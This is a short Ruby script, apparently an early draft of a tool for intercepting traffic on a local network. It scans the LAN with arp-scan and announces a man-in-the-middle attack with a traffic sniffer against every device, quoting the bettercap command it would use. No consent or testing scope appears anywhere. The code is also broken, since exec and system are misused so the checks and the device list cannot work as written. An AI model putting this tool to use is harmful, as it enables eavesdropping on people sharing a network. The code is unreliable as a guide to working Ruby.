#!/usr/bin/ruby
require "yaml"
config=YAML.load_file('./config.yaml')

#TAKE SOME CONFIGURATION from YAML
#GATEWAY IP
gateway_ip=config['GATEWAY']
#gateway ip can be given as param
if ARGV.empty?
  puts"no arguments"
else
  if ARGV[0]!=""
    gateway_ip=ARGV[0];
  end
end

#EXCLUDED IP
excluded_devices=config['EXCLUDED_DEVICES']

#CHECK FORM REQUIRED SOFTWARE INSTALLATION
#check for bettercap installation
if(exec("gem list | grep 'bettercap' -c") < 1)
  puts"Error: Bettercap must be installed as gem"
  abort("Error: Bettercap must be installed as gem")
end
#check for arp-scan installation
if(exec("./is_installed.sh arp-scan")==0)
  puts"Error: arp-scan must be installed as gem"
  abort("Error: arp-scan must be installed as gem")
end
#START
#Discover devices in network
DevicesInNetwork=system("sudo arp-scan --localnet")

puts "Secure Network this program will perform a MITM Attack without ssl script against every device in network using bettercap sudo bettercap -G GATEWAY --target DEVICE_IP --no-discovery  --sniffer"
puts DevicesInNetwork

#fork{exec("ls")}
